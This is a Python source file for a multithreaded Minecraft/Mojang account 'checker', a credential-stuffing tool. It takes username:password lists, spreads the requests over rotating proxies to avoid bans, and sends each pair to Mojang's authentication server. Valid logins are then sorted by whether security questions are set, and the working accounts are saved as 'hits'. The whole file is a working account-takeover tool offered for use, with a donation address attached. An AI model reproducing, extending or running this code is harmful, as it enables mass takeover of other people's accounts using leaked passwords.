import requests
from requests import Timeout
from multiprocessing import JoinableQueue as Queue
import threading
import os
from threading import Thread
import random
import ctypes
import time
from time import sleep
import socks
import webbrowser
import easygui


from static.menu import threads, timeout, proxy_type, logs, main_menu, colors
from static.proxies import requests_proxy, load_proxy, scrape_proxies
from static.wordlists import load_wordlist, vail_wordlists
from static.results import results



class status:
    Hits = 0
    Free = 0
    Secured = 0
    Unsecured = 0
    errors = 0
    wordlist = 0
    loaded_wordlist = 0

class cpm:
    def __init__(self,start_timestamp):
        self.start_timestamp = start_timestamp
    
    def cpm(self):
        cpm = 0.0
        seconds = int(time.time()) - self.start_timestamp
        try:
            cpm = status.wordlist / seconds * 60
        except:
            pass
        return cpm
global cpm_counter
cpm_counter = cpm(int(time.time()))


def print_logs(arg):
    lock = threading.Lock()
    lock.acquire()
    print(arg)
    lock.release()


def check_version():
    try:
        getversion = requests.get("https://raw.githubusercontent.com/Stainpy/Minecraft-Py/main/version.json")
        data = getversion.json()
        current_version = data['version']
        url = data['link']
        if version != current_version:
            main_menu()
            while 1:
                inp = input(colors.yellow + f"  New version available!\n  Your current version is {version}, latest version is {current_version}\n  [1]: Download now\n  [2]: Skip\n  > ")
                if inp.isdigit():
                    inp = int(inp)
                    if inp == 1:
                        link = webbrowser.open(url)
                        time.sleep(1)
                        os.system('cls')
                        return link
                    elif inp == 2:
                        time.sleep(1)
                        os.system('cls')
                        break
                    else:
                        print(colors.red + "  Error!! Please choose one of available modes.")
                        pass
                else:
                    print(colors.red + "  Error!! Please enter a digit.")
    except:
        main_menu()
        print(colors.red + "  Something went wrong while checking for updates!")
        os.system('pause>nul')
        os.system('cls')


def updateTitle():
    meow = int(cpm_counter.cpm())
    ctypes.windll.kernel32.SetConsoleTitleW(f"Minecraft Py v{version} | Status: {status.wordlist}/{status.loaded_wordlist} Errors/Banned: {status.errors} CPM: {meow} | Hits: {status.Hits} Unsecured: {status.Unsecured} Secured: {status.Secured} Free: {status.Free}")
    pass


def login(q,proxies,log,proxy_type):
    while True:
        goodAttempt = False
        item = q.get()

        if (item==None):
            return False
        
        while not (goodAttempt):
            username = item[0]
            password = item[1]
            def login_function(username,password,proxy,proxy_type):
                sess = requests.session()

                url = "https://authserver.mojang.com/authenticate"
                data ={"agent":{"name":"Minecraft", "version":1}, "username":username, "password":password, "requestUser":"true"}
                agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
                headers = {"Content-Type":"application/json", "User-Agent":agent, "Pragma":"no-cache", "Accept":"*/*"}
                failkeys = ["MethodNotAllowed","NotFound","ForbiddenOperationException","IllegalArgumentException", "IllegalArgumentException", "Unsupported MediaType"]
                
                if proxy != None:
                    proxy = requests_proxy(proxy, proxy_type)

                rsp = ""

                try:
                    rsp = sess.post(url, json=data, headers=headers, proxies=proxy, timeout=timeout)
                except requests.ConnectionError:
                    status.errors += 1
                    return False
                except requests.Timeout:
                    status.errors += 1
                    return False
                except:
                    status.errors += 1
                    return False

                try:
                    data = rsp.json()
                except:
                    return False

                if any(x in rsp.text for x in failkeys):
                    if log == 1:
                        print_logs(colors.red + f" [Fail]: {username}:{password}")
                    return True

                elif 'selectedProfile' not in rsp.text:
                    print_logs(colors.yellow + f" [Free]: {username}:{password}")
                    results.Free(f"{username}:{password} | Free ")
                    status.Free += 1
                    if status.Free == 1 and results.timestamp == None:
                        results.timestamp                    
                    updateTitle()                    
                    return True

                else:
                    pass
                    
                token = data['accessToken']
                mcusername = data['selectedProfile']['name']

                url2 = "https://api.mojang.com/user/security/challenges"
                headers2 = {"Content-Type":"application/json", "User-Agent":agent, "Pragma":"no-cache", "Accept":"*/*", "Authorization":f"Bearer {token}"}

                try:
                    rsp2 = sess.get(url2, headers=headers2)
                except requests.ConnectionError:
                    status.errors += 1
                    return False
                except requests.Timeout:
                    status.errors += 1
                    return False
                except:
                    status.errors += 1
                    return False
                
                if 'answer' in rsp2.text:
                    print_logs(colors.green + f" [Secured]: {username}:{password} | Username: {mcusername}")
                    results.Secured(f"{username}:{password} | Username: {mcusername} | Secured")
                    status.Secured += 1
                    if status.Secured == 1 and results.timestamp == None:
                        results.timestamp                    

                    results.Hits(f"{username}:{password} | Username: {mcusername} | Secured")
                    status.Hits += 1
                    updateTitle()
                    return True

                elif 'answer' not in rsp2.text:
                    security = 'Unsecured'
                    print_logs(colors.cyan + f" [Unsecured]: {username}:{password} | Username: {mcusername}")
                    results.Unsecured(f"{username}:{password} | Username: {mcusername} | Unsecured")
                    status.Unsecured += 1
                    if status.Unsecured == 1 and results.timestamp == None:
                        results.timestamp                    

                    results.Hits(f"{username}:{password} | Username: {mcusername} | Unsecured")
                    status.Hits += 1
                    updateTitle()
                    return True

                else:
                    pass

            proxy = None
            if proxies:
                proxy = random.choice(proxies)
            goodAttempt = login_function(username,password,proxy,proxy_type)
            if goodAttempt == False:
                if log == 1:
                    print_logs(colors.normal + f" [Error]: {username}:{password}")

        else:
            status.wordlist +=1
            updateTitle()
            q.task_done()



if __name__ == "__main__":

    about = """
    Discord: StaiN#9677

    GitHub: https://github.com/Stainpy

    Bitcoin Address: 3BJcvDSwqPQKRxKqMgaAL9YA1T7ZfGRt9P
    """
    easygui.msgbox(msg=about, title='About', ok_button='Close', image=None, root=None)

    version = 3.8
    check_version()

    open("proxies.txt", "a").close()
    open("wordlists.txt", "a").close()

    main_menu()

    while True:
            mode = (input(colors.normal + "  [1]: Load Proxies\n  [2]: Proxy Scraper\n  [3]: Proxyless\n  > "))
            if mode.isdigit():
                mode = int(mode)
                if mode == 1:
                    proxy_type = proxy_type()
                    proxies = load_proxy(proxy_type)
                    break
                elif mode == 2:
                    proxy_type = proxy_type()
                    proxies = scrape_proxies(proxy_type)
                    break
                elif mode == 3:
                    proxy_type = 'proxyless'
                    proxies = load_proxy(proxy_type)
                    break
            else:
                print(colors.red + "  Error!! Please enter a digit.")

    threads_input = threads()
    timeout = timeout()
    log = logs()

    worldist_array = load_wordlist()
    status.loaded_wordlist = len(worldist_array)
    q = vail_wordlists(worldist_array)
    time.sleep(1)

    os.system('cls')

    for i in range(threads_input):
        worker = Thread(target=login, args=(q, proxies, log, proxy_type))
        worker.setDaemon(True)
        worker.start()

    q.join()



os.system('pause>nul')
